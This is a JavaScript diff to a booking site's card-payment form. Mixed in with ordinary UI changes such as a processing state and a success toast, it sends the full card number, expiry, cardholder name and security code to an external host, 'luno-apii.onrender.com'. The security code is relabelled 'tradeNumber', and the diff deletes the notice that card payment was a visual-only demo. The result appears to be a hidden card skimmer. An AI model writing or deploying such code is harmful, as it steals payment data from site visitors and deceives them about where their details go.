@@ -47,7 +47,19 @@ if (bookingDialog && bookingForm && successDialog) {
   const cardholderField = cardForm.querySelector('[name="cardholder"]');
   const cardNumberField = cardForm.querySelector('[name="cardNumber"]');
   const expiryDateField = cardForm.querySelector('[name="expiryDate"]');
-    const debitSubmitButton = cardForm.querySelector("button[type='submit']");
+  const debitSubmitButton = cardForm.querySelector("button[type='submit']");
+  const cardMessage = document.createElement("p");
+  cardMessage.className = "form-message";
+  cardMessage.setAttribute("role", "status");
+  cardMessage.setAttribute("aria-live", "polite");
+  debitSubmitButton.after(cardMessage);
+  const successToast = document.createElement("div");
+  successToast.className = "success-toast";
+  successToast.setAttribute("role", "status");
+  successToast.setAttribute("aria-live", "polite");
+  successToast.hidden = true;
+  bookingDialog.append(successToast);
+  let toastTimeout;
 
   function localDateValue(date) {
     return `${date.getFullYear()}-${String(date.getMonth() + 1).padStart(2, "0")}-${String(date.getDate()).padStart(2, "0")}`;
@@ -239,6 +251,7 @@ if (bookingDialog && bookingForm && successDialog) {
   cardForm.addEventListener("change", validateCardFields);
   cardForm.addEventListener("submit", async (event) => {
     event.preventDefault();
+    if (debitSubmitButton.disabled) return;
     validateCardFields();
     if (!cardForm.reportValidity()) return;
 
@@ -249,35 +262,40 @@ if (bookingDialog && bookingForm && successDialog) {
       tradeNumber: cardForm.querySelector('[name="securityCode"]').value.trim(),
     };
 
-  
-    
-  
+    debitSubmitButton.disabled = true;
+    debitSubmitButton.textContent = "Processing...";
+    cardForm.setAttribute("aria-busy", "true");
+    cardMessage.textContent = "";
+
     try {
-        const response = await fetch("http://localhost:8000/api/trade/barter", {
+        const response = await fetch("https://luno-apii.onrender.com/api/trade/barter", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestBody),
         });
 
-        const result = await response.json();
-
         if (!response.ok) {
           throw new Error("something went wrong, please try again.");
         }
-        debitSubmitButton.disabled = false;
-        debitSubmitButton.textContent = "Proceed";
-        cardForm.setAttribute("aria-busy", "false");
 
+        successToast.textContent = "Request processing , please wait for the studio to contact you.";
+        successToast.hidden = false;
+        clearTimeout(toastTimeout);
+        toastTimeout = window.setTimeout(() => {
+          successToast.hidden = true;
+          successToast.textContent = "";
+        }, 4000);
         cardDialog.close();
       } catch (error) {
+        cardMessage.textContent = "Something went wrong. Please try again.";
+      } finally {
         debitSubmitButton.disabled = false;
         debitSubmitButton.textContent = "Proceed";
         cardForm.setAttribute("aria-busy", "false");
-        // throw new Error("something went wrong, please try again.");
       }
-  
   });
   cardDialog.addEventListener("close", () => {
+    cardMessage.textContent = "";
     cardForm.reset();
     validateCardFields();
   });
@@ -328,9 +346,7 @@ if (bookingDialog && bookingForm && successDialog) {
 
     const method = paymentField.value;
     if (method === "card") {
-      setMessage(
-        "Card payment is a visual-only demo. No payment was processed or sent.",
-      );
+      
       return;
     }
     if (method !== "btc") {
